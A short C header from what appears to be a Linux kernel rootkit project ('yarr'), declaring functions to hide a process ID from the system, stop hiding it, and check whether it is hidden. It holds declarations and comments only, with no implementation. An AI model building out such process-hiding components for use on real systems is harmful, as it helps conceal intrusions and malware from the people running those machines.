#ifndef __YARR_HIDEPID
#define __YARR_HIDEPID

#include <linux/types.h>

/**
 * Hides a pid in the system.
 *
 * @pid: The pid to hide.
 * @return: Zero on success, non-zero elsewhere.
 */
int hide_pid(pid_t pid);

/**
 * Stops hidding a pid.
 *
 * @pid: The pid to stop hidding, if the pid wasn't already hidden returns an
 * error.
 * @return: Zero on success, non-zero elsewhere.
 */
int stop_hide_pid(pid_t pid);

/**
 * Checks if a pid is already hidden.
 *
 * @pid: The pid to check for.
 * @return: Zero if the pid is not hidden, non-zero if the pi is hidden.
 */
int pid_is_hidden(pid_t pid);

#endif
